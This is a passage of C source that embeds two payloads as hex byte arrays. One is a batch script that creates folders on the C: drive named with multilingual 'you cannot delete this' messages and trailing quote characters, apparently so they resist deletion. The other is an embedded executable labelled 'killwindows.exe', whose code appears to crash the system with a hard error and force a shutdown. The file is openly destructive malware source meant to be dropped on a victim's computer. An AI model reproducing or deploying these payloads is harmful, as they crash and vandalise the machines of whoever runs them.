0xBE, 0x65, 0x74, 0x65, 0x20, 0x6F, 0x76, 0x6F, 0x20, 0x75, 0x6B, 0x6C, 0x6F, 0x6E, 0x69, 0x74,
0x69, 0x20, 0x5C, 0x22, 0x0D, 0x0A, 0x4D, 0x44, 0x20, 0x22, 0x63, 0x3A, 0x20, 0x4E, 0x6F, 0x20,
0x70, 0x6F, 0x74, 0x73, 0x20, 0x74, 0x72, 0x65, 0x75, 0x72, 0x65, 0x20, 0x61, 0x69, 0x78, 0xC3,
0xB2, 0x20, 0x5C, 0x22, 0x0D, 0x0A, 0x6D, 0x64, 0x20, 0x22, 0x43, 0x3A, 0x20, 0x54, 0x65, 0x20,
0x65, 0x69, 0x20, 0x73, 0x61, 0x61, 0x20, 0x73, 0x65, 0x64, 0x61, 0x20, 0x65, 0x65, 0x6D, 0x61,
0x6C, 0x64, 0x61, 0x64, 0x61, 0x20, 0x5C, 0x22, 0x0D, 0x0A, 0x4D, 0x44, 0x20, 0x22, 0x63, 0x3A,
0x20, 0xE0, 0xAA, 0xA4, 0xE0, 0xAA, 0xAE, 0xE0, 0xAB, 0x87, 0x20, 0xE0, 0xAA, 0x86, 0xE0, 0xAA,
0xA8, 0xE0, 0xAB, 0x87, 0x20, 0xE0, 0xAA, 0xA6, 0xE0, 0xAB, 0x82, 0xE0, 0xAA, 0xB0, 0x20, 0xE0,
0xAA, 0x95, 0xE0, 0xAA, 0xB0, 0xE0, 0xAB, 0x80, 0x20, 0xE0, 0xAA, 0xB6, 0xE0, 0xAA, 0x95, 0xE0,
0xAA, 0xA4, 0xE0, 0xAA, 0xBE, 0x20, 0xE0, 0xAA, 0xA8, 0xE0, 0xAA, 0xA5, 0xE0, 0xAB, 0x80, 0x20,
0x5C, 0x22, 0x20, 0x0D, 0x0A, 0x6D, 0x64, 0x20, 0x22, 0x43, 0x3A, 0x20, 0xD7, 0x90, 0xD7, 0x99,
0xD7, 0xA0, 0xD7, 0x9A, 0x20, 0xD7, 0x99, 0xD7, 0x9B, 0xD7, 0x95, 0xD7, 0x9C, 0x20, 0xD7, 0x9C,
0xD7, 0x94, 0xD7, 0xA1, 0xD7, 0x99, 0xD7, 0xA8, 0x20, 0xD7, 0x96, 0xD7, 0x90, 0xD7, 0xAA, 0x20,
0x5C, 0x22, 0x0D, 0x0A, 0x4D, 0x44, 0x20, 0x22, 0x63, 0x3A, 0x20, 0x4B, 0x6F, 0x6A, 0x20, 0x74,
0x73, 0x69, 0x73, 0x20, 0x74, 0x75, 0x61, 0x6A, 0x20, 0x79, 0x65, 0x65, 0x6D, 0x20, 0x74, 0x73,
0x68, 0x65, 0x6D, 0x20, 0x71, 0x68, 0x6F, 0x76, 0x20, 0x6E, 0x6F, 0x20, 0x5C, 0x22, 0x0D, 0x0A,
0x4D, 0x44, 0x20, 0x22, 0x63, 0x3A, 0x20, 0x4E, 0x6F, 0x20, 0x70, 0x75, 0x65, 0x64, 0x65, 0x73,
0x20, 0x71, 0x75, 0x69, 0x74, 0x61, 0x72, 0x20, 0x65, 0x73, 0x74, 0x6F, 0x20, 0x5C, 0x22, 0x0D,
0x0A, 0x6D, 0x64, 0x20, 0x22, 0x43, 0x3A, 0x20, 0x59, 0x4F, 0x55, 0x20, 0x43, 0x41, 0x4E, 0x4E,
0x4F, 0x54, 0x20, 0x44, 0x45, 0x4C, 0x45, 0x54, 0x45, 0x20, 0x54, 0x48, 0x49, 0x53, 0x20, 0x5C,
0x22, 0x0D, 0x0A, 0x6D, 0x64, 0x20, 0x22, 0x43, 0x3A, 0x20, 0x41, 0x6E, 0x64, 0x61, 0x20, 0x74,
0x69, 0x64, 0x61, 0x6B, 0x20, 0x64, 0x61, 0x70, 0x61, 0x74, 0x20, 0x6D, 0x65, 0x6E, 0x67, 0x68,
0x61, 0x70, 0x75, 0x73, 0x20, 0x69, 0x6E, 0x69, 0x20, 0x5C, 0x22, 0x0D, 0x0A, 0x4D, 0x44, 0x20,
0x22, 0x63, 0x3A, 0x20, 0x4E, 0xC3, 0xAD, 0x20, 0x66, 0xC3, 0xA9, 0x69, 0x64, 0x69, 0x72, 0x20,
0x6C, 0x65, 0x61, 0x74, 0x20, 0xC3, 0xA9, 0x20, 0x73, 0x65, 0x6F, 0x20, 0x61, 0x20, 0x62, 0x68,
0x61, 0x69, 0x6E, 0x74, 0x20, 0x5C, 0x22, 0x0D, 0x0A, 0x6D, 0x64, 0x20, 0x22, 0x43, 0x3A, 0x20,
0xC3, 0x9E, 0xC3, 0xBA, 0x20, 0x67, 0x65, 0x74, 0x75, 0x72, 0x20, 0x65, 0x6B, 0x6B, 0x69, 0x20,
0x66, 0x6A, 0x61, 0x72, 0x6C, 0xC3, 0xA6, 0x67, 0x74, 0x20, 0xC3, 0xBE, 0x65, 0x74, 0x74, 0x61,
0x20, 0x5C, 0x22, 0x0D, 0x0A, 0x6D, 0x64, 0x20, 0x22, 0x43, 0x3A, 0x20, 0xE3, 0x81, 0x93, 0xE3,
0x82, 0x8C, 0xE3, 0x81, 0xAF, 0xE5, 0x89, 0x8A, 0xE9, 0x99, 0xA4, 0xE3, 0x81, 0xA7, 0xE3, 0x81,
0x8D, 0xE3, 0x81, 0xBE, 0xE3, 0x81, 0x9B, 0xE3, 0x82, 0x93, 0x20, 0x5C, 0x22, 0x0D, 0x0A, 0x6D,
0x64, 0x20, 0x22, 0x43, 0x3A, 0x20, 0x53, 0x61, 0x6D, 0x70, 0x65, 0x79, 0x61, 0x6E, 0x20, 0x6F,
0x72, 0x61, 0x20, 0x62, 0x69, 0x73, 0x61, 0x20, 0x6D, 0x62, 0x75, 0x73, 0x61, 0x6B, 0x20, 0x69,
0x6B, 0x69, 0x20, 0x5C, 0x22, 0x0D, 0x0A, 0x6D, 0x64, 0x20, 0x22, 0x43, 0x3A, 0x20, 0x4E, 0x74,
0x75, 0x73, 0x68, 0x6F, 0x62, 0x6F, 0x72, 0x61, 0x20, 0x67, 0x75, 0x73, 0x69, 0x62, 0x61, 0x20,
0x69, 0x62, 0x69, 0x20, 0x5C, 0x22, 0x0D, 0x0A, 0x6D, 0x64, 0x20, 0x22, 0x43, 0x3A, 0x20, 0x56,
0x6F, 0x63, 0xC3, 0xAA, 0x20, 0x6E, 0xC3, 0xA3, 0x6F, 0x20, 0x70, 0x6F, 0x64, 0x65, 0x20, 0x64,
0x65, 0x6C, 0x65, 0x74, 0x61, 0x72, 0x20, 0x69, 0x73, 0x74, 0x6F, 0x20, 0x5C, 0x22, 0x0D, 0x0A,
0x0D, 0x0A, 0x63, 0x6C, 0x73, 0x0D, 0x0A };
const size_t bat_len = sizeof(batm);

/* killwindows.exe program - 10kb */
const unsigned char kwp[] = { 0x4D, 0x5A, 0x90, 0x00, 0x03, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00,
0xFF, 0xFF, 0x00, 0x00, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0xF0, 0x00, 0x00, 0x00, 0x0E, 0x1F, 0xBA, 0x0E, 0x00, 0xB4, 0x09, 0xCD,
0x21, 0xB8, 0x01, 0x4C, 0xCD, 0x21, 0x54, 0x68, 0x69, 0x73, 0x20, 0x70,
0x72, 0x6F, 0x67, 0x72, 0x61, 0x6D, 0x20, 0x63, 0x61, 0x6E, 0x6E, 0x6F,
0x74, 0x20, 0x62, 0x65, 0x20, 0x72, 0x75, 0x6E, 0x20, 0x69, 0x6E, 0x20,
0x44, 0x4F, 0x53, 0x20, 0x6D, 0x6F, 0x64, 0x65, 0x2E, 0x0D, 0x0D, 0x0A,
0x24, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0C, 0xCB, 0x83, 0x07,
0x48, 0xAA, 0xED, 0x54, 0x48, 0xAA, 0xED, 0x54, 0x48, 0xAA, 0xED, 0x54,
0x41, 0xD2, 0x7E, 0x54, 0x42, 0xAA, 0xED, 0x54, 0x1A, 0xDF, 0xEC, 0x55,
0x4A, 0xAA, 0xED, 0x54, 0x1A, 0xDF, 0xE8, 0x55, 0x5B, 0xAA, 0xED, 0x54,
0x1A, 0xDF, 0xE9, 0x55, 0x44, 0xAA, 0xED, 0x54, 0x1A, 0xDF, 0xEE, 0x55,
0x49, 0xAA, 0xED, 0x54, 0x5C, 0xC1, 0xEC, 0x55, 0x4F, 0xAA, 0xED, 0x54,
0x48, 0xAA, 0xEC, 0x54, 0x75, 0xAA, 0xED, 0x54, 0x1D, 0xDF, 0xE4, 0x55,
0x49, 0xAA, 0xED, 0x54, 0x1D, 0xDF, 0x12, 0x54, 0x49, 0xAA, 0xED, 0x54,
0x1D, 0xDF, 0xEF, 0x55, 0x49, 0xAA, 0xED, 0x54, 0x52, 0x69, 0x63, 0x68,
0x48, 0xAA, 0xED, 0x54, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x50, 0x45, 0x00, 0x00, 0x4C, 0x01, 0x05, 0x00, 0x7C, 0x09, 0xFB, 0x60,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xE0, 0x00, 0x02, 0x01,
0x0B, 0x01, 0x0E, 0x1D, 0x00, 0x10, 0x00, 0x00, 0x00, 0x16, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x08, 0x15, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00,
0x00, 0x20, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x10, 0x00, 0x00,
0x00, 0x02, 0x00, 0x00, 0x06, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x06, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x60, 0x00, 0x00,
0x00, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x03, 0x00, 0x40, 0x81,
0x00, 0x00, 0x10, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00,
0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x94, 0x26, 0x00, 0x00,
0xC8, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0xE0, 0x01, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x50, 0x00, 0x00, 0xA8, 0x01, 0x00, 0x00,
0x18, 0x22, 0x00, 0x00, 0x70, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x88, 0x22, 0x00, 0x00,
0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x20, 0x00, 0x00, 0x04, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x2E, 0x74, 0x65, 0x78,
0x74, 0x00, 0x00, 0x00, 0x41, 0x0F, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00,
0x00, 0x10, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x20, 0x00, 0x00, 0x60,
0x2E, 0x72, 0x64, 0x61, 0x74, 0x61, 0x00, 0x00, 0x86, 0x0D, 0x00, 0x00,
0x00, 0x20, 0x00, 0x00, 0x00, 0x0E, 0x00, 0x00, 0x00, 0x14, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x40, 0x00, 0x00, 0x40, 0x2E, 0x64, 0x61, 0x74, 0x61, 0x00, 0x00, 0x00,
0x94, 0x03, 0x00, 0x00, 0x00, 0x30, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00,
0x00, 0x22, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0xC0, 0x2E, 0x72, 0x73, 0x72,
0x63, 0x00, 0x00, 0x00, 0xE0, 0x01, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00,
0x00, 0x02, 0x00, 0x00, 0x00, 0x24, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x40,
0x2E, 0x72, 0x65, 0x6C, 0x6F, 0x63, 0x00, 0x00, 0xA8, 0x01, 0x00, 0x00,
0x00, 0x50, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x26, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x40, 0x00, 0x00, 0x42, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x55, 0x8B, 0xEC, 0x53, 0x56, 0x57, 0x33, 0xF6,
0x33, 0xDB, 0x33, 0xFF, 0x0F, 0x1F, 0x40, 0x00, 0x8B, 0xC6, 0x4E, 0x85,
0xC0, 0x75, 0x0B, 0x57, 0x53, 0xFF, 0x55, 0x08, 0x83, 0xC4, 0x08, 0x8B,
0xF0, 0x43, 0x6A, 0x0A, 0x47, 0xFF, 0x15, 0x40, 0x20, 0x40, 0x00, 0xEB,
0xE3, 0xCC, 0xCC, 0xCC, 0x68, 0x10, 0x27, 0x00, 0x00, 0x68, 0xE8, 0x03,
0x00, 0x00, 0xFF, 0x15, 0x14, 0x20, 0x40, 0x00, 0x83, 0xC8, 0xFF, 0xC2,
0x04, 0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
0x55, 0x8B, 0xEC, 0x83, 0xEC, 0x10, 0xA1, 0x04, 0x30, 0x40, 0x00, 0x33,
0xC5, 0x89, 0x45, 0xFC, 0x8B, 0x45, 0x0C, 0x53, 0x8B, 0x5D, 0x10, 0x56,
0x8B, 0x35, 0x74, 0x20, 0x40, 0x00, 0x6A, 0x00, 0x89, 0x45, 0xF0, 0xFF,
0xD6, 0x6A, 0x01, 0xA3, 0x84, 0x33, 0x40, 0x00, 0xFF, 0xD6, 0xA3, 0x80,
0x33, 0x40, 0x00, 0x8B, 0x45, 0x08, 0x83, 0xF8, 0x03, 0x75, 0x68, 0x8B,
0x33, 0x89, 0x75, 0xF4, 0xF7, 0x46, 0x20, 0x00, 0x00, 0x40, 0x80, 0x74,
0x5A, 0x57, 0x8B, 0x3D, 0x04, 0x20, 0x40, 0x00, 0x8D, 0x45, 0xF8, 0x50,
0x6A, 0x04, 0xFF, 0x35, 0x88, 0x33, 0x40, 0x00, 0xFF, 0xD7, 0x8B, 0x45,
0xF8, 0x8B, 0x0D, 0x84, 0x33, 0x40, 0x00, 0x25, 0xFF, 0xFF, 0xFF, 0x7F,
0x2B, 0x4E, 0x14, 0x99, 0xF7, 0xF9, 0x8D, 0x45, 0xF8, 0x50, 0x6A, 0x04,
0xFF, 0x35, 0x88, 0x33, 0x40, 0x00, 0x8B, 0xF2, 0xFF, 0xD7, 0x8B, 0x7D,
0xF4, 0x8B, 0x45, 0xF8, 0x8B, 0x0D, 0x80, 0x33, 0x40, 0x00, 0x25, 0xFF,
0xFF, 0xFF, 0x7F, 0x99, 0x2B, 0x4F, 0x10, 0xF7, 0xF9, 0x8B, 0x45, 0x08,
0x89, 0x77, 0x1C, 0x89, 0x57, 0x18, 0x5F, 0x53, 0xFF, 0x75, 0xF0, 0x50,
0x6A, 0x00, 0xFF, 0x15, 0x64, 0x20, 0x40, 0x00, 0x8B, 0x4D, 0xFC, 0x5E,
0x33, 0xCD, 0x5B, 0xE8, 0xA7, 0x01, 0x00, 0x00, 0x8B, 0xE5, 0x5D, 0xC2,
0x0C, 0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
0xCC, 0xCC, 0xCC, 0xCC, 0xFF, 0x15, 0x44, 0x20, 0x40, 0x00, 0x50, 0x6A,
0x00, 0x68, 0x50, 0x10, 0x40, 0x00, 0x6A, 0x05, 0xFF, 0x15, 0x60, 0x20,
0x40, 0x00, 0x6A, 0x30, 0x68, 0x98, 0x21, 0x40, 0x00, 0x68, 0xB0, 0x21,
0x40, 0x00, 0x6A, 0x00, 0xFF, 0x15, 0x68, 0x20, 0x40, 0x00, 0x6A, 0x30,
0x68, 0x98, 0x21, 0x40, 0x00, 0x68, 0xF4, 0x21, 0x40, 0x00, 0x6A, 0x00,
0xFF, 0x15, 0x68, 0x20, 0x40, 0x00, 0xB8, 0x01, 0x00, 0x00, 0x00, 0xC2,
0x04, 0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
0x56, 0x8B, 0x35, 0x40, 0x20, 0x40, 0x00, 0x57, 0x8B, 0x3D, 0x24, 0x20,
0x40, 0x00, 0x66, 0x90, 0x6A, 0x00, 0x6A, 0x00, 0x6A, 0x00, 0x68, 0x20,
0x11, 0x40, 0x00, 0x68, 0x00, 0x10, 0x00, 0x00, 0x6A, 0x00, 0xFF, 0xD7,
0x6A, 0x64, 0xFF, 0xD6, 0xEB, 0xE6, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
0x55, 0x8B, 0xEC, 0x83, 0xEC, 0x20, 0xA1, 0x04, 0x30, 0x40, 0x00, 0x33,
0xC5, 0x89, 0x45, 0xFC, 0x53, 0x56, 0x57, 0x6A, 0x00, 0xFF, 0x15, 0x1C,
0x20, 0x40, 0x00, 0x50, 0xFF, 0x15, 0x70, 0x20, 0x40, 0x00, 0x8B, 0x35,
0x24, 0x20, 0x40, 0x00, 0x6A, 0x00, 0x6A, 0x00, 0x68, 0x30, 0x10, 0x40,
0x00, 0x68, 0x00, 0x10, 0x40, 0x00, 0x6A, 0x00, 0x6A, 0x00, 0xFF, 0xD6,
0x6A, 0x00, 0x6A, 0x00, 0x6A, 0x00, 0x68, 0x70, 0x11, 0x40, 0x00, 0x68,
0x00, 0x10, 0x00, 0x00, 0x6A, 0x00, 0xFF, 0xD6, 0x68, 0xE8, 0x03, 0x00,
0x00, 0xFF, 0x15, 0x40, 0x20, 0x40, 0x00, 0x68, 0x40, 0x21, 0x40, 0x00,
0xFF, 0x15, 0x3C, 0x20, 0x40, 0x00, 0x8B, 0x35, 0x18, 0x20, 0x40, 0x00,
0x8B, 0xF8, 0x68, 0x48, 0x21, 0x40, 0x00, 0x57, 0xFF, 0xD6, 0x68, 0x5C,
0x21, 0x40, 0x00, 0x57, 0x8B, 0xD8, 0xFF, 0xD6, 0x8B, 0xF0, 0x85, 0xDB,
0x74, 0x26, 0x85, 0xF6, 0x74, 0x22, 0x8D, 0x45, 0xFB, 0x50, 0x6A, 0x00,
0x6A, 0x01, 0x6A, 0x13, 0xFF, 0xD3, 0x8D, 0x45, 0xF4, 0x50, 0x6A, 0x06,
0x6A, 0x00, 0x6A, 0x00, 0x6A, 0x00, 0x68, 0x9A, 0x02, 0x00, 0xC0, 0xFF,
0xD6, 0x83, 0xC4, 0x28, 0x8D, 0x45, 0xE0, 0x50, 0x6A, 0x28, 0xFF, 0x15,
0x4C, 0x20, 0x40, 0x00, 0x50, 0xFF, 0x15, 0x08, 0x20, 0x40, 0x00, 0x8D,
0x45, 0xE8, 0x50, 0x68, 0x70, 0x21, 0x40, 0x00, 0x6A, 0x00, 0xFF, 0x15,
0x0C, 0x20, 0x40, 0x00, 0x6A, 0x00, 0x6A, 0x00, 0x6A, 0x00, 0x8D, 0x45,
0xE4, 0xC7, 0x45, 0xE4, 0x01, 0x00, 0x00, 0x00, 0x50, 0x6A, 0x00, 0xFF,
0x75, 0xE0, 0xC7, 0x45, 0xF0, 0x02, 0x00, 0x00, 0x00, 0xFF, 0x15, 0x00,
0x20, 0x40, 0x00, 0x68, 0x07, 0x00, 0x01, 0x00, 0x6A, 0x06, 0xFF, 0x15,
0x6C, 0x20, 0x40, 0x00, 0x8B, 0x4D, 0xFC, 0x33, 0xC0, 0x5F, 0x5E, 0x33,
0xCD, 0x5B, 0xE8, 0x04, 0x00, 0x00, 0x00, 0x8B, 0xE5, 0x5D, 0xC3, 0x3B,
0x0D, 0x04, 0x30, 0x40, 0x00, 0x75, 0x01, 0xC3, 0xE9, 0x79, 0x02, 0x00,
0x00, 0x56, 0x6A, 0x01, 0xE8, 0x76, 0x0B, 0x00, 0x00, 0xE8, 0x56, 0x06,
0x00, 0x00, 0x50, 0xE8, 0xA1, 0x0B, 0x00, 0x00, 0xE8, 0x44, 0x06, 0x00,
0x00, 0x8B, 0xF0, 0xE8, 0xC5, 0x0B, 0x00, 0x00, 0x6A, 0x01, 0x89, 0x30,
0xE8, 0xFA, 0x03, 0x00, 0x00, 0x83, 0xC4, 0x0C, 0x5E, 0x84, 0xC0, 0x74,
0x73, 0xDB, 0xE2, 0xE8, 0x73, 0x08, 0x00, 0x00, 0x68, 0x97, 0x1B, 0x40,
0x00, 0xE8, 0x6E, 0x05, 0x00, 0x00, 0xE8, 0x19, 0x06, 0x00, 0x00, 0x50,
0xE8, 0x3E, 0x0B, 0x00, 0x00, 0x59, 0x59, 0x85, 0xC0, 0x75, 0x51, 0xE8,
0x12, 0x06, 0x00, 0x00, 0xE8, 0x69, 0x06, 0x00, 0x00, 0x85, 0xC0, 0x74,
0x0B, 0x68, 0x1D, 0x19, 0x40, 0x00, 0xE8, 0x1A, 0x0B, 0x00, 0x00, 0x59,
0xE8, 0x29, 0x06, 0x00, 0x00, 0xE8, 0x24, 0x06, 0x00, 0x00, 0xE8, 0xFE,
0x05, 0x00, 0x00, 0xE8, 0xDD, 0x05, 0x00, 0x00, 0x50, 0xE8, 0x53, 0x0B,
0x00, 0x00, 0x59, 0xE8, 0xEA, 0x05, 0x00, 0x00, 0x84, 0xC0, 0x74, 0x05,
0xE8, 0xFC, 0x0A, 0x00, 0x00, 0xE8, 0xC3, 0x05, 0x00, 0x00, 0xE8, 0x5A,
0x07, 0x00, 0x00, 0x85, 0xC0, 0x75, 0x01, 0xC3, 0x6A, 0x07, 0xE8, 0x33,
0x06, 0x00, 0x00, 0xCC, 0xE8, 0xF8, 0x05, 0x00, 0x00, 0x33, 0xC0, 0xC3,
0xE8, 0x88, 0x07, 0x00, 0x00, 0xE8, 0x9F, 0x05, 0x00, 0x00, 0x50, 0xE8,
0x1B, 0x0B, 0x00, 0x00, 0x59, 0xC3, 0x6A, 0x14, 0x68, 0x58, 0x26, 0x40,
0x00, 0xE8, 0x3E, 0x08, 0x00, 0x00, 0x6A, 0x01, 0xE8, 0x11, 0x03, 0x00,
0x00, 0x59, 0x84, 0xC0, 0x0F, 0x84, 0x50, 0x01, 0x00, 0x00, 0x32, 0xDB,
0x88, 0x5D, 0xE7, 0x83, 0x65, 0xFC, 0x00, 0xE8, 0xC8, 0x02, 0x00, 0x00,
0x88, 0x45, 0xDC, 0xA1, 0x34, 0x33, 0x40, 0x00, 0x33, 0xC9, 0x41, 0x3B,
0xC1, 0x0F, 0x84, 0x2F, 0x01, 0x00, 0x00, 0x85, 0xC0, 0x75, 0x49, 0x89,
0x0D, 0x34, 0x33, 0x40, 0x00, 0x68, 0x20, 0x21, 0x40, 0x00, 0x68, 0x14,
0x21, 0x40, 0x00, 0xE8, 0x87, 0x0A, 0x00, 0x00, 0x59, 0x59, 0x85, 0xC0,
0x74, 0x11, 0xC7, 0x45, 0xFC, 0xFE, 0xFF, 0xFF, 0xFF, 0xB8, 0xFF, 0x00,
0x00, 0x00, 0xE9, 0xEF, 0x00, 0x00, 0x00, 0x68, 0x10, 0x21, 0x40, 0x00,
0x68, 0x08, 0x21, 0x40, 0x00, 0xE8, 0x5B, 0x0A, 0x00, 0x00, 0x59, 0x59,
0xC7, 0x05, 0x34, 0x33, 0x40, 0x00, 0x02, 0x00, 0x00, 0x00, 0xEB, 0x05,
0x8A, 0xD9, 0x88, 0x5D, 0xE7, 0xFF, 0x75, 0xDC, 0xE8, 0xE1, 0x03, 0x00,
0x00, 0x59, 0xE8, 0x6F, 0x05, 0x00, 0x00, 0x8B, 0xF0, 0x33, 0xFF, 0x39,
0x3E, 0x74, 0x1B, 0x56, 0xE8, 0x39, 0x03, 0x00, 0x00, 0x59, 0x84, 0xC0,
0x74, 0x10, 0x8B, 0x36, 0x57, 0x6A, 0x02, 0x57, 0x8B, 0xCE, 0xFF, 0x15,
0x04, 0x21, 0x40, 0x00, 0xFF, 0xD6, 0xE8, 0x4D, 0x05, 0x00, 0x00, 0x8B,
0xF0, 0x39, 0x3E, 0x74, 0x13, 0x56, 0xE8, 0x13, 0x03, 0x00, 0x00, 0x59,
0x84, 0xC0, 0x74, 0x08, 0xFF, 0x36, 0xE8, 0x30, 0x0A, 0x00, 0x00, 0x59,
0xE8, 0xEE, 0x09, 0x00, 0x00, 0x8B, 0xF8, 0xE8, 0x11, 0x0A, 0x00, 0x00,
0x8B, 0x30, 0xE8, 0x04, 0x0A, 0x00, 0x00, 0x57, 0x56, 0xFF, 0x30, 0xE8,
0x20, 0xFD, 0xFF, 0xFF, 0x83, 0xC4, 0x0C, 0x8B, 0xF0, 0xE8, 0x34, 0x06,
0x00, 0x00, 0x84, 0xC0, 0x74, 0x6B, 0x84, 0xDB, 0x75, 0x05, 0xE8, 0xF0,
0x09, 0x00, 0x00, 0x6A, 0x00, 0x6A, 0x01, 0xE8, 0x7B, 0x03, 0x00, 0x00,
